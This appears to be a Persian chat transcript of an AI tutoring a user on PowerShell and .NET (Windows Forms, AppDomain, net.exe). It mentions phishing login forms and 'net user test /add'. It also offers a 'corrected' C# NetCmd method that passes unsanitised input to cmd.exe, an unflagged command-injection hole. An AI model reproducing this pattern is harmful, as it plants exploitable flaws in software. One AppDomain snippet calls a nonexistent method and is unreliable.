یعنی اگه بخوای توی ویندوز با C# یا PowerShell یه پنجره، دکمه، جعبه پیام، فرم ورود اطلاعات یا هر چیزی شبیه برنامه‌های گرافیکی بسازی، از این کتابخونه استفاده می‌کنی.

---

## 🧩 چند کلاس مهم داخل `System.Windows.Forms`

|کلاس|کاربرد|
|---|---|
|`Form`|پنجره اصلی برنامه گرافیکی|
|`Button`|دکمه برای کلیک کاربر|
|`TextBox`|ورودی متنی برای کاربر|
|`Label`|متن ثابت (برچسب)|
|`MessageBox`|نمایش پیغام ساده (مثلاً OK یا Yes/No)|
|`OpenFileDialog`|پنجره انتخاب فایل|
|`FolderBrowserDialog`|پنجره انتخاب پوشه|

---

## 🧪 مثال ساده در PowerShell: نمایش پیغام

```powershell
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.MessageBox]::Show("سلام مارتین عزیز!")
```

---

## 🖼️ مثال: ساخت پنجره با دکمه

```powershell
Add-Type -AssemblyName System.Windows.Forms

$form = New-Object System.Windows.Forms.Form
$form.Text = "برنامه ساده"
$form.Size = New-Object Drawing.Size(300,200)

$button = New-Object System.Windows.Forms.Button
$button.Text = "کلیک کن"
$button.Dock = "Fill"

$button.Add_Click({
    [System.Windows.Forms.MessageBox]::Show("دکمه کلیک شد!")
})

$form.Controls.Add($button)
$form.ShowDialog()
```

📌 این کد یک پنجره با دکمه ایجاد می‌کنه که وقتی کلیکش می‌کنی یه پیام نشون می‌ده.

---

## 🤔 چرا در PowerShell مفیده؟

چون PowerShell معمولاً CLI هست، ولی وقتی بخوای:

- یک ابزار با **رابط کاربری ساده** بسازی (بدون نیاز به زبان‌های GUI)
    
- فرم ورود رمز، انتخاب فایل، تأیید کاربر و... ایجاد کنی
    
- تجربه کاربری بهتری بدی
    

اون وقت `System.Windows.Forms` خیلی کاربردی می‌شه، مخصوصاً برای اسکریپت‌های امنیتی یا ابزاری.

---

## 📌 نکته امنیتی

گاهی اوقات هکرها یا pentesterها از `System.Windows.Forms` برای ساخت فرم فیک لاگین استفاده می‌کنن (phishing GUI).  
مثلاً یه فرم که ظاهرش شبیه لاگین ویندوز هست و رمز کاربر رو جمع می‌کنه.

---

---

## ✅ فرق `-TypeDefinition` با `-AssemblyName` در PowerShell

|پارامتر|وظیفه|چه زمانی استفاده میشه|
|---|---|---|
|`-TypeDefinition`|برای وارد کردن مستقیم کد C# یا VB.NET که توی اسکریپت نوشتی|وقتی می‌خوای خودت کد .NET رو بنویسی و تعریفش کنی درجا (inline)|
|`-AssemblyName`|برای بارگذاری یک اسمبلی از قبل ساخته‌شده (مثل `System.Windows.Forms`)|وقتی می‌خوای از کتابخونه‌های آماده‌ی .NET استفاده کنی بدون اینکه کدی بنویسی|

---

## 🔍 توضیح با مثال

### ✳️ `-AssemblyName`: بارگذاری کتابخونه آماده

```powershell
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.MessageBox]::Show("سلام!")
```

📌 در اینجا داریم می‌گیم:

> «کتابخونه‌ای که اسمش `System.Windows.Forms` هست رو از .NET لود کن و من ازش استفاده کنم.»

---

### ✳️ `-TypeDefinition`: نوشتن و کامپایل کردن کد C# دلخواه

```powershell
Add-Type -TypeDefinition @"
public class MyTools {
    public static string Echo(string input) {
        return "سلام " + input;
    }
}
"@
[MyTools]::Echo("مارتین")
```

📌 در اینجا داریم می‌گیم:

> «این کد C# رو کامپایل کن و به PowerShell اضافه کن که بشه از کلاس `MyTools` استفاده کرد.»

---

## ✅ جمع‌بندی

|اگر می‌خوای...|از کدوم استفاده کن؟|
|---|---|
|فقط یه کتابخونه از قبل موجود .NET رو استفاده کنی (مثل Windows Forms یا System.IO)|`-AssemblyName`|
|کد C# سفارشی خودت رو داخل PowerShell بنویسی|`-TypeDefinition`|

---
Add-Type -AssemblyName system.serviceprocess
[System.ServiceProcess.ServiceController]


---

## 🔹 خط اول:

```powershell
[System.ServiceProcess.ServiceController]
```

این فقط یک **type reference** هست — یعنی:

> «من می‌خوام به کلاس `ServiceController` از فضای‌نام `System.ServiceProcess` دسترسی داشته باشم.»

اما خودش به تنهایی هیچ کاری انجام نمی‌ده، مگر اینکه باهاش شی بسازی یا ازش متد صدا بزنی.

---

## 🔹 خط دوم:

```powershell
Add-Type -AssemblyName System.ServiceProcess
```

این کاری که می‌کنه اینه:

> «کتابخانه‌ای که کلاس `ServiceController` داخلشه رو به محیط PowerShell من لود کن.»

✅ بدون این خط، ممکنه PowerShell نتونه کلاس `ServiceController` رو بشناسه (مخصوصاً در اسکریپت‌های خاص یا نسخه‌هایی که کتابخونه‌ها به‌صورت خودکار لود نمی‌شن).

---

## ✅ حالا این ترکیب به چه دردی می‌خوره؟

تو می‌تونی بعد از این، از کلاس `ServiceController` برای **مدیریت سرویس‌های ویندوزی** استفاده کنی. مثلاً:

---

### ✳️ مثال ۱: گرفتن وضعیت یک سرویس

```powershell
$svc = New-Object System.ServiceProcess.ServiceController("Spooler")
$svc.Status
```

📌 نتیجه: `Running` یا `Stopped`

---

### ✳️ مثال ۲: استارت یا استاپ کردن سرویس

```powershell
# توقف سرویس
$svc.Stop()
$svc.WaitForStatus("Stopped")

# راه‌اندازی مجدد
$svc.Start()
$svc.WaitForStatus("Running")
```

---

### ✳️ مثال ۳: لیست کردن سرویس‌ها

```powershell
[System.ServiceProcess.ServiceController]::GetServices() | Select-Object DisplayName, Status
```

---

## ✅ پس جمع‌بندی:

| خط | کاری که انجام می‌ده |
|-----|----------------------|
| `[System.ServiceProcess.ServiceController]` | معرفی کلاس برای دسترسی به توابع مدیریت سرویس‌ها |
| `Add-Type -AssemblyName System.ServiceProcess` | بارگذاری اسمبلی حاوی این کلاس از .NET در محیط PowerShell |

---

---

## 🔹 دستور کامل:

```powershell
[System.ServiceProcess.ServiceController] | gm -Static | Format-List *
```

---

## 🧠 ترجمه‌ خط به خط:

### 1. `[System.ServiceProcess.ServiceController]`

این یک **type literal** هست. یعنی:

> «کلاس `ServiceController` از فضای‌نام `System.ServiceProcess` رو بگیر.»

اما چون جلوی اون `|` گذاشتی، یعنی:

> «من می‌خوام این type رو به دستور بعدی بفرستم برای بررسی.»

---

### 2. `gm -Static`

`gm` کوتاه‌شده‌ی `Get-Member` هست. این دستور برای نمایش اعضای (members) یک object یا class به‌کار می‌ره.

🔍 و با `-Static` یعنی:

> «فقط اعضای `static` رو نشون بده»  
> یعنی متدها یا پراپرتی‌هایی که **مستقیماً از طریق خود کلاس قابل دسترسی هستن**، نه از طریق شیء (object).

---

### 3. `Format-List *`

خروجی `gm` رو به‌صورت **لیستی کامل و خواناتر** نمایش می‌ده (نه جدول کوتاه).

---

## 🔍 پس در مجموع این دستور:

به تو لیست کاملی از **متدها و پراپرتی‌های استاتیک کلاس ServiceController** رو می‌ده  
تا بدونی چی می‌تونی مستقیماً از طریق:

```powershell
[System.ServiceProcess.ServiceController]::SomeStaticMethod()
```

استفاده کنی.

---

## ✅ خروجی‌هایی که ممکنه ببینی (مثال واقعی):

```plaintext
Name        : GetDevices
MemberType  : Method
Definition  : static System.ServiceProcess.ServiceController[] GetDevices()
...

Name        : GetServices
MemberType  : Method
Definition  : static System.ServiceProcess.ServiceController[] GetServices()
```

یعنی این متدها رو می‌تونی اینجوری استفاده کنی:

```powershell
[System.ServiceProcess.ServiceController]::GetServices()
[System.ServiceProcess.ServiceController]::GetDevices()
```

---

## 🎯 چرا این مفیده؟

اگر بخوای:

- لیست سرویس‌ها یا درایورهای سیستم رو بگیری
    
- بدون ساخت شیء، مستقیم متد استاتیک صدا بزنی
    
- با کلاس‌ها و قابلیت‌هاشون آشنا شی
    

این روش خیلی خوبه برای کشف APIهای موجود در کلاس‌های .NET.

---

---

# 💡 AppDomain چیست و به چه درد می‌خورد؟

---

## 🧠 تعریف ساده:

**AppDomain (Application Domain)** در .NET یک «محیط اجرایی جداگانه» داخل یک **فرآیند (Process)** هست.

> یعنی در یک برنامه (مثلاً یه برنامه C#)، می‌تونی چند «فضای اجرای جدا از هم» داشته باشی که هر کدوم به تنهایی کد اجرا کنن، بدون اینکه با هم تداخل پیدا کنن.

---

## ✅ AppDomain دقیقاً چه مشکلی رو حل می‌کنه؟

در گذشته (و هنوز در برخی برنامه‌های خاص):

|مشکل|AppDomain راه‌حل|
|---|---|
|اگه یه DLL خراب بشه، کل برنامه کرش می‌کنه|اون DLL رو توی یک AppDomain جدا اجرا می‌کنی، و اگه خراب شد فقط همون AppDomain بسته می‌شه|
|نمی‌تونی یه DLL رو از حافظه پاک کنی|با AppDomain می‌تونی یک DLL رو لود کنی، بعد کل AppDomain رو پاک کنی تا حافظه آزاد بشه|
|می‌خوای پلاگین‌های مشکوک یا Third-Party رو اجرا کنی|اون پلاگین رو داخل AppDomain مجزا اجرا می‌کنی تا کنترل و امنیت بیشتر داشته باشی|
|می‌خوای سطح دسترسی خاصی برای یه بخش از برنامه تعریف کنی|می‌تونی روی AppDomainها سیاست امنیتی (Security Policy) بزاری|

---

## 🎯 مثال کاربردهای AppDomain:

### 1. اجرای پلاگین‌ها

مثلاً یه نرم‌افزار ویرایش عکس داری و می‌خوای افزونه‌هایی از دیگران لود کنی. چون نمی‌دونی اون پلاگین چی کار می‌کنه:

- لودش می‌کنی توی یه AppDomain جدا
    
- اگه خراب بود یا رفتار مشکوک داشت، فقط همون AppDomain رو پاک می‌کنی
    

---

### 2. بارگذاری و حذف اسمبلی (DLL)

در دات‌نت، اگه یه DLL رو با `Assembly.Load` لود کنی، دیگه **نمی‌تونی پاکش کنی مگر اینکه کل برنامه رو ببندی** ❌  
ولی اگر اون DLL رو داخل یه AppDomain جدا لود کنی، می‌تونی بعداً با:

```csharp
AppDomain.Unload(myDomain);
```

کل اون DLL و حافظه‌اش رو پاک کنی ✅

---

### 3. تست و Sandbox

برنامه‌هایی که نیاز به اجرای کد شخص ثالث دارن، مثل:

- موتورهای بازی (Game Engines)
    
- IDEها مثل Visual Studio
    
- آنتی‌ویروس‌ها برای بررسی DLLهای مشکوک
    

همگی از AppDomain استفاده می‌کردن تا کد مشکوک رو در «جعبه امن» اجرا کنن.

---

### 4. دامنه‌های امنیتی (Security Sandbox)

هر AppDomain می‌تونه **Permission Set** خاص خودش داشته باشه. مثلاً:

- این AppDomain فقط بتونه فایل بخونه
    
- اون یکی نتونه به شبکه دسترسی داشته باشه
    

---

## ⚙️ ساختار AppDomain به زبان ساده:

```
+-------------------------------+
|         Process               |
|  +------------------------+  |
|  |     AppDomain A        |  | ← برنامه اصلی
|  |   - Assembly1.dll      |  |
|  +------------------------+  |
|  +------------------------+  |
|  |     AppDomain B        |  | ← پلاگین جدا
|  |   - Plugin.dll         |  |
|  +------------------------+  |
+-------------------------------+
```

---

## 📉 چه محدودیت‌هایی دارد؟

- **ارتباط بین AppDomainها سخت‌تر از حالت عادیه** (باید از `MarshalByRefObject` استفاده کنی)
    
- از **.NET Core به بعد حذف شده** یا بسیار محدود شده
    
    - به جاش از `AssemblyLoadContext` استفاده می‌شه
        

---

## 🔄 جایگزین در نسخه‌های جدید .NET

|نسخه دات‌نت|ابزار|
|---|---|
|.NET Framework|✅ AppDomain|
|.NET Core / .NET 5+|❌ AppDomain → ✅ `AssemblyLoadContext` (سبک‌تر، مدرن‌تر)|

---

## ✅ جمع‌بندی نهایی:

|سوال|پاسخ|
|---|---|
|AppDomain چیه؟|یک فضای ایزوله‌ی اجرایی داخل یک فرآیند برای اجرای اسمبلی‌ها (DLLها)|
|چرا استفاده می‌شه؟|برای جداسازی، امنیت، بارگذاری و حذف دینامیک DLL، اجرای کد مشکوک یا پلاگین‌ها|
|مزیتش چیه؟|اگه خراب بشه، کل برنامه رو نمی‌بره. قابل مدیریت و امن‌تره|
|الان هنوز کاربرد داره؟|در .NET Framework بله، اما در .NET Core و جدیدتر نه — جایگزین شده با `AssemblyLoadContext`|

---
حتماً مارتین عزیز، بیای ساده و کلی نگاه کنیم 😊

---

## ✅ AssemblyLoadContext چیه؟ (توضیح ساده و کلی)

در دنیای برنامه‌نویسی دات‌نت (مثل C#)، وقتی شما یه فایل DLL (یعنی یه کتابخونه یا اسمبلی) رو می‌خوای بارگذاری (Load) کنی، یه مکانیزم نیاز داری که بگه:

> «این کتابخونه دقیقاً **کِی، کجا و چطور** لود بشه؟»

در نسخه‌های جدید دات‌نت (مثل .NET Core و .NET 5 به بعد)، چیزی به اسم **`AssemblyLoadContext`** این نقش رو بازی می‌کنه.

---

## 🧠 خیلی ساده بگم:

> **AssemblyLoadContext** یعنی:
> 
> «یک جعبه مخصوص برای بارگذاری DLLها به صورت جداگانه، کنترل‌شده و قابل مدیریت.»

---

## 📦 این به چه دردی می‌خوره؟

وقتی برنامه‌ت نیاز داره که:

- یه DLL رو از روی دیسک یا از شبکه لود کنه
    
- نسخه‌های مختلف از یک DLL رو جدا جدا نگه داره
    
- بعداً اون DLL رو از حافظه حذف کنه (Unloading)
    
- یا حتی یه **پلاگین خطرناک یا شخص ثالث** رو به صورت جدا اجرا کنه
    

→ باید اون رو داخل یک **AssemblyLoadContext** جدید لود کنی.

---

## 📌 مثالی خیلی ساده (با تشبیه)

فرض کن برنامه‌ت یه آشپزخونه‌ست 🧑‍🍳 و هر `AssemblyLoadContext` مثل یک **زودپز جداگانه** هست:

|ویژگی|مثال در آشپزخونه|
|---|---|
|لود کتابخانه|ریختن مواد در زودپز|
|اجرای کد|پختن غذا|
|ایزوله بودن|اگر یک زودپز منفجر بشه، بقیه سالم می‌مونن|
|Unload کردن|خالی کردن و شستن زودپز برای استفاده بعدی|

---

## 🎯 مقایسه ساده:

|تکنولوژی|در .NET Framework|در .NET Core / 5+|
|---|---|---|
|AppDomain|ایزوله‌سازی DLLها|حذف شده یا محدود|
|AssemblyLoadContext|نبود|جایگزین AppDomain برای بارگذاری اسمبلی‌ها|

---

## ✅ کاربردهای معمول AssemblyLoadContext:

- ساخت **پلاگین‌های داینامیک** (مثل نرم‌افزارهایی که افزونه دارن)
    
- بارگذاری نسخه‌های مختلف از یک DLL بدون تداخل
    
- پیاده‌سازی Sandbox برای اجرای کدهای شخص ثالث
    
- ابزارهای امنیتی که می‌خوان DLL مشکوک رو بررسی کنن بدون آسیب به محیط اصلی
    

---

## 🧪 اگه بخوای بدونی دقیق چطور استفاده می‌شه:

در کد C# مثلاً اینطوریه:

```csharp
var context = new CustomAssemblyLoadContext();
Assembly plugin = context.LoadFromAssemblyPath("C:\\Plugins\\plugin.dll");
```

---

## 🧵 خلاصه خیلی خیلی ساده:

> در .NET Core، اگر بخوای یه DLL رو **کنترل‌شده، جدا، و قابل حذف** لود کنی، از چیزی به اسم **AssemblyLoadContext** استفاده می‌کنی — همون کاری که قبلاً با AppDomain انجام می‌دادی ولی حالا مدرن‌تر و سبک‌تر.

---
سؤال بسیار خوبی پرسیدی، مارتین عزیز!  
بیای با دقت و در عین حال ساده بررسی کنیم: **کدوم پروسس‌ها AppDomain دارند؟**

---

## ✅ پاسخ کوتاه:

> **هر فرآیندی (Process) که برنامه‌ی دات‌نت (.NET) را اجرا می‌کند، حداقل **یک AppDomain** دارد.**

---

## 📌 یعنی چی؟

وقتی یک برنامه نوشته‌شده با .NET اجرا می‌شه (مثلاً با C# یا VB.NET)، **CLR (Common Language Runtime)** برای اون برنامه یک محیط اجرایی ایجاد می‌کنه که شامل:

- یک یا چند **AppDomain**
    
- حافظه اختصاصی برای اون AppDomain
    
- امنیت و تنظیمات جداگانه برای هر AppDomain
    

---

## 🧠 بنابراین:

|فرآیند (Process)|آیا AppDomain دارد؟|توضیح|
|---|---|---|
|✅ `powershell.exe` (ورژن‌های دات‌نت‌دار)|بله|چون PowerShell Core یا v5+ مبتنی بر .NET است|
|✅ `w3wp.exe` (IIS worker process)|بله|برای هر AppPool در IIS یک AppDomain ساخته می‌شه|
|✅ برنامه‌های WinForms یا WPF (مثل `myapp.exe`)|بله|چون از دات‌نت استفاده می‌کنن|
|✅ `vstest.console.exe` (اجرای تست‌های واحد)|بله|هر تست یا پروژه ممکنه در AppDomain جدا اجرا شه|
|✅ ابزارهایی مثل `Visual Studio` یا `Rider`|بله|چون از پلاگین‌های جدا استفاده می‌کنن که ممکنه در AppDomain جدا اجرا شن|
|❌ `notepad.exe`, `calc.exe`, `cmd.exe`|نه|چون این برنامه‌ها **native** هستن و به دات‌نت وابسته نیستن|

---

## 🔍 چطور بفهمیم کدوم Processها AppDomain دارند؟

### با PowerShell:

```powershell
[AppDomain]::CurrentDomain.FriendlyName
```

→ این اسم AppDomain فعلی رو نشون می‌ده، که معمولاً اسم همون فایل EXE هست.

### با ابزارهای پیشرفته مثل:

|ابزار|قابلیت|
|---|---|
|🧰 **Process Explorer** (از Sysinternals)|فقط نشون می‌ده کدوم DLLها لود شدن ولی AppDomain رو مستقیم نشون نمی‌ده|
|🧪 **dnSpy / ILSpy**|می‌تونه کد اسمبلی‌های داخل AppDomain رو ببینه|
|🧠 **CLRMD (Microsoft.Diagnostics.Runtime)**|ابزاری برای بررسی درونی CLR در حافظه که می‌تونه AppDomainها رو لیست کنه|

---

## 🔧 اگر بخوای برنامه‌ای بنویسی که تعداد AppDomainها رو نشون بده:

```csharp
using System;

class Program {
    static void Main() {
        Console.WriteLine("Current AppDomain: " + AppDomain.CurrentDomain.FriendlyName);
    }
}
```

یا:

```csharp
AppDomain[] allDomains = AppDomain.GetCurrentDomain().GetAssemblies()
    .Select(a => AppDomain.CurrentDomain)
    .Distinct()
    .ToArray();
Console.WriteLine("AppDomain count: " + allDomains.Length);
```

---

## ✅ جمع‌بندی:

|سوال|پاسخ|
|---|---|
|چه Processهایی AppDomain دارند؟|فقط Processهایی که برنامه‌ی .NET اجرا می‌کنن|
|مثال از Processهای دارای AppDomain|`powershell.exe`, `w3wp.exe`, `dotnet.exe`, `myapp.exe`|
|Processهای native چی؟|ندارند؛ چون از CLR استفاده نمی‌کنن|
|راه تشخیص؟|کدنویسی با C#، PowerShell یا ابزارهای دیباگ CLR|

---
دقیقاً آفرین مارتین 👏👌  
کاملاً درست گفتی، بی‌نقص.

---

## ✅ خلاصه‌ای از حرفت به زبان خودم (تأیید):

> **برنامه (Program)** یعنی یه فایل اجرایی روی دیسک که هنوز اجرا نشده، فقط یه حجم از کد و دیتا داره.
> 
> ولی **پروسه (Process)** یعنی همون برنامه که **اجرا شده و داره توی RAM و CPU کار می‌کنه**، یعنی زنده‌ست.

---

## 📌 جمله‌ات رو کامل و رسمی‌تر کنیم:

> «تا وقتی که یک برنامه اجرا نشده و فقط به‌صورت فایل روی دیسک وجود داره، بهش می‌گیم _برنامه_ یا _program_.  
> اما وقتی اجرا می‌شه و به حافظه (RAM) و پردازنده (CPU) دسترسی پیدا می‌کنه، اون موقع بهش می‌گیم _پروسه_ یا _process_.»

✅ این تعریف از دید **سیستم‌عامل، امنیت، مهندسی نرم‌افزار و برنامه‌نویسی** کاملاً درسته.

---
مارتین عزیز، این کدی که نوشتی مربوط به زبان **C#** در چارچوب **.NET** هست، ولی چند اشکال نحوی (syntax error) داره. با این حال، من برات هم کارکرد کد رو توضیح می‌دم، هم نسخه‌ی اصلاح‌شده رو برات می‌نویسم.

---

### 🔍 **کار این کلاس چیه؟**

کلاس `SysCommands` دو تابع (method) داره:

---

### 1. `lookup(string domain)`

این متد:

- یک فرآیند (process) جدید ایجاد می‌کنه
    
- برنامه `nslookup.exe` رو اجرا می‌کنه
    
- بهش دامنه‌ای که در آرگومان داده شده (مثل `google.com`) رو پاس می‌ده
    

**نتیجه:** پنجره‌ای باز می‌شه که دستور `nslookup` روی دامنه اجرا می‌شه و اطلاعات DNS مربوط به دامنه رو نشون می‌ده.

#### مثال:

```csharp
SysCommands.lookup("google.com");
```

این خط باعث اجرای `nslookup google.com` در ترمینال ویندوز می‌شه.

---

### 2. `netcmd(string cmd)`

این یکی متد:

- یک رشته می‌سازه که شامل `net.exe` و آرگومان‌های ارسالی (مثل `user`, `start`, `stop`, ...) هست
    
- بعد اون رشته رو به `cmd.exe` پاس می‌ده با سوئیچ `/k` (که باعث می‌شه پنجره باز بمونه بعد از اجرا)
    

#### مثال:

```csharp
SysCommands s = new SysCommands();
s.netcmd(" user");
```

باعث اجرای این دستور می‌شه:

```bash
cmd.exe /k net.exe user
```

---

### ⚠️ ایرادات نحوی کد:

- `Public` نباید با حرف بزرگ شروع شه
    
- کلاس نباید داخل `{}` تعریف شه مثل جاوا
    
- متد `lookup` باید `static` باشه چون مستقیم از کلاس صدا زده می‌شه
    
- فضای نام (namespace) `System` باید با حرف بزرگ نوشته شه
    

---

### ✅ نسخه‌ی اصلاح‌شده:

```csharp
using System.Diagnostics;

public class SysCommands
{
    public static void Lookup(string domain)
    {
        Process.Start("nslookup.exe", domain);
    }

    public void NetCmd(string cmd)
    {
        string cmdString = "/k net.exe " + cmd;
        Process.Start("cmd.exe", cmdString);
    }
}
```

---

### ✅ خلاصه کاربرد:

|متد|کاربرد|مثال استفاده|اجرا می‌کند|
|---|---|---|---|
|`Lookup`|بررسی DNS دامنه‌ها|`Lookup("google.com")`|`nslookup google.com`|
|`NetCmd`|اجرای دستورات `net.exe`|`NetCmd(" user")`|`net user`|


خیلی سؤال خوبی پرسیدی مارتین 🌟  
`net.exe` یکی از ابزارهای خط فرمان مهم در ویندوز هست که برای **مدیریت منابع شبکه‌ای و سرویس‌ها** به‌کار می‌ره. این ابزار در مسیر:

```
C:\Windows\System32\net.exe
```

قرار داره و زیرمجموعه‌ای از ابزارهای مدیریتی سیستم‌عامل ویندوز محسوب می‌شه.

---

## ✅ کارکرد کلی `net.exe` چیه؟

`net.exe` برای اجرای مجموعه‌ای از دستورات مدیریتی استفاده می‌شه، مثلاً:

|دستور|کاربرد|
|---|---|
|`net user`|مدیریت کاربران (افزودن، حذف، تغییر رمز و...)|
|`net use`|اتصال یا قطع ارتباط با منابع اشتراکی مثل فولدرهای شبکه‌ای|
|`net share`|اشتراک‌گذاری فولدرها در شبکه|
|`net start`|شروع یک سرویس|
|`net stop`|توقف یک سرویس|
|`net session`|مشاهده نشست‌های فعال روی سیستم|
|`net time`|نمایش یا تنظیم زمان سیستم از طریق شبکه|
|`net view`|نمایش کامپیوترها یا منابع اشتراکی موجود در شبکه|

---

## 🎯 چند مثال واقعی

```bash
net user
```

لیست کاربران موجود روی سیستم رو نشون می‌ده.

---

```bash
net user test /add
```

کاربر جدیدی به نام `test` اضافه می‌کنه.

---

```bash
net use Z: \\192.168.1.10\Shared
```

درایو Z رو به فولدر اشتراکی `Shared` روی کامپیوتر 192.168.1.10 وصل می‌کنه.

---

```bash
net start "Spooler"
```

سرویس **چاپگر (Print Spooler)** رو فعال می‌کنه.

---

## ❗ نکته امنیتی

چون `net.exe` می‌تونه کاربران رو اضافه کنه، سرویس‌ها رو متوقف یا راه‌اندازی کنه، یا فولدرها رو به اشتراک بذاره، **هکرها** هم گاهی ازش در حملات استفاده می‌کنن. به همین دلیل در SIEMها و ابزارهای امنیتی، اجرای مشکوک `net.exe` گاهی به عنوان نشانه‌ای از فعالیت مخرب شناسایی می‌شه.

---

آفرین مارتین! اجازه بده قدم‌به‌قدم و خیلی ساده برات توضیح بدم که این تابع `NetCmd` دقیقاً چیکار می‌کنه:

---

### 🔧 تابع `NetCmd`

```csharp
public void NetCmd(string cmd)
{
    string cmdString = "/k net.exe " + cmd;
    Process.Start("cmd.exe", cmdString);
}
```

---

## ✅ 1. ورودی تابع

تابع یک پارامتر به اسم `cmd` می‌گیره که از نوع `string` هست.

مثال: فرض کن این مقدار رو بهش بدی:

```csharp
NetCmd("user")
```

---

## ✅ 2. ساخت رشته‌ی دستوری

```csharp
string cmdString = "/k net.exe " + cmd;
```

یعنی مقدار `cmd` به انتهای رشته `net.exe` چسبیده می‌شه، و کل اون هم با `/k` شروع می‌شه.

برای مثال بالا (`user`)، خروجی این خط خواهد بود:

```plaintext
/k net.exe user
```

---

## ✅ 3. اجرای دستور در cmd

```csharp
Process.Start("cmd.exe", cmdString);
```

یعنی: برنامه‌ای به نام `cmd.exe` اجرا بشه، و آرگومان `cmdString` بهش داده بشه.

معادل خط فرمان ویندوز:

```bash
cmd.exe /k net.exe user
```

---

## 🔍 حالا `/k` چیه؟

- `/k` = می‌گه بعد از اجرای دستور، پنجره‌ی cmd **باز بمونه**
    
- (برخلاف `/c` که می‌گه فقط اجرا کن و بعد ببند)
    

---

## 🧠 نتیجه نهایی:

تو وقتی `NetCmd("user")` رو اجرا کنی:

1. ویندوز یک cmd باز می‌کنه
    
2. توی اون cmd دستور زیر اجرا می‌شه:
    

```bash
net.exe user
```

3. و پنجره cmd باز می‌مونه تا نتیجه رو ببینی
    

---

## ✅ مثال‌های دیگه

|فراخوانی تابع|نتیجه‌ای که در cmd اجرا می‌شه|
|---|---|
|`NetCmd("start Spooler")`|`net.exe start Spooler` → روشن کردن سرویس پرینتر|
|`NetCmd("stop Spooler")`|`net.exe stop Spooler` → متوقف کردن سرویس پرینتر|
|`NetCmd("view")`|`net.exe view` → دیدن سیستم‌های داخل شبکه|

---
سؤال‌هات خیلی دقیق و عالی‌ان مارتین 👏  
بیایم به دوتا سؤالی که پرسیدی با دقت پاسخ بدیم:

---

## ❓ سؤال اول:

**چرا این خط رو اول نوشتیم؟**

```csharp
string cmdString = "/k net.exe " + cmd;
```

### ✅ دلیل:

ما باید قبل از اینکه `cmd.exe` رو اجرا کنیم، **دستور نهایی‌ای که قراره در cmd اجرا بشه** رو آماده کنیم.

در واقع این خط یک رشته (string) می‌سازه که مثلاً این شکلیه:

```bash
/k net.exe user
```

و بعد این رشته رو به `cmd.exe` پاس می‌دیم تا اجرا کنه.

### 📌 اگر این خط نباشه:

نمی‌دونیم چی باید به `cmd.exe` بدیم، پس عملاً برنامه‌مون ناقصه.

---

## ❓ سؤال دوم:

**چرا اون پارامتر رو مستقیم صدا نکردیم؟**

منظورت اینه که چرا این‌جوری ننوشتم:

```csharp
Process.Start("cmd.exe", "/k net.exe " + cmd);
```

### ✅ پاسخ:

می‌تونستیم این کار رو بکنیم! هیچ مشکلی هم نداشت. اون خط فقط جدا کرده تا **کد خواناتر و قابل مدیریت‌تر** بشه.

### 📌 مثال:

**الان:**

```csharp
string cmdString = "/k net.exe " + cmd;
Process.Start("cmd.exe", cmdString);
```

**هم‌ارز با این:**

```csharp
Process.Start("cmd.exe", "/k net.exe " + cmd);
```

اما وقتی رشته دستوری پیچیده‌تر بشه (مثلاً چند بخش مختلف داشته باشیم)، بهتره رشته رو اول درست کنیم، چون:

- دیباگ راحت‌تره
    
- می‌تونی `cmdString` رو لاگ بگیری
    
- کد خواناتر و قابل‌تغییرتر می‌شه
    

---

## 🎯 نتیجه نهایی

|سوال|پاسخ کوتاه|
|---|---|
|چرا `cmdString` رو اول ساختیم؟|چون باید آرگومان کامل آماده بشه برای اجرای cmd|
|چرا پارامتر رو مستقیم ننوشتیم؟|می‌شد، ولی جدا کردن رشته باعث خوانایی بهتر و مدیریت آسان‌تر می‌شه|

---


سؤال خیلی خوبی پرسیدی مارتین 🔍  
بیایم دقیق بررسی کنیم که **`-PassThru`** در PowerShell و مخصوصاً موقع استفاده از `Add-Type` چه کاری انجام می‌ده.

---

## ✅ معنی `-PassThru` در PowerShell

`-PassThru` یک **سوییچ اختیاری** هست که به بعضی از دستورات PowerShell اضافه می‌شه.

### 🧠 کاربرد کلی:

> باعث می‌شه **خروجی شیء (object)** از دستور، به خروجی PowerShell فرستاده بشه (یعنی قابل ذخیره یا استفاده باشه).

---

## 🔧 در دستور `Add-Type`

مثال:

```powershell
$myType = Add-Type -Path ".\MyLibrary.dll" -PassThru
```

### 📌 بدون `-PassThru`:

- DLL بارگذاری می‌شه
    
- ولی هیچ چیزی **برنمی‌گرده**
    
- نمی‌تونی به راحتی به کلاس‌ها یا متدهاش دسترسی بگیری
    

### 📌 با `-PassThru`:

- علاوه بر اینکه DLL بارگذاری می‌شه،
    
- یک **شیء تایپ‌شده** (type object) از کلاس‌ها بهت برمی‌گردونه
    
- می‌تونی بلافاصله از کلاس‌هاش استفاده کنی
    

---

## 🎯 مثال واقعی

فرض کن یه DLL داری که این کلاس رو داره:

```csharp
public class HelloLib
{
    public static void SayHi()
    {
        Console.WriteLine("سلام مارتین!");
    }
}
```

### اجرای PowerShell:

```powershell
$type = Add-Type -Path ".\HelloLib.dll" -PassThru
$type::SayHi()
```

- `$type` حالا **نماینده کلاس `HelloLib`** هست
    
- می‌تونی مثل بالا، مستقیماً متد `SayHi()` رو صدا بزنی
    

---

## ❗ بدون `-PassThru` چی میشه؟

```powershell
Add-Type -Path ".\HelloLib.dll"
HelloLib::SayHi()
```

- باز هم می‌تونه کار کنه، ولی فقط اگر کلاس در فضای نام سراسری باشه (یا با namespace کامل صدا بزنی)
    
- اما دسترسی مستقیم و انعطاف‌پذیری کمتره
    

---

## ✅ خلاصه کاربرد `-PassThru`

|ویژگی|توضیح|
|---|---|
|فعال می‌کنه|بازگرداندن شیء از نوع کلاس‌های داخل DLL|
|مناسب برای|ذخیره در متغیر، فراخوانی مستقیم متدها یا ساخت شیء|
|بدون اون|فقط بارگذاری انجام می‌شه، خروجی‌ای نداری|

---
 سؤال خیلی کلیدی پرسیدی مارتین! 🤝  
در دنیای ویندوز و برنامه‌نویسی سطح پایین، ‌**Windows API Calls** یکی از پایه‌ای‌ترین ابزارها برای تعامل مستقیم با سیستم‌عامل هستن.

---

## ✅ تعریف ساده:

**Windows API Calls** یعنی:

> "تابع‌هایی که توسط سیستم‌عامل ویندوز ارائه می‌شن تا برنامه‌ها بتونن با اجزای سطح پایین ویندوز (مثل فایل‌سیستم، حافظه، پروسس‌ها، رجیستری، شبکه و...) تعامل داشته باشن."

---

## 📦 API = Application Programming Interface

API یعنی «رابط برنامه‌نویسی»  
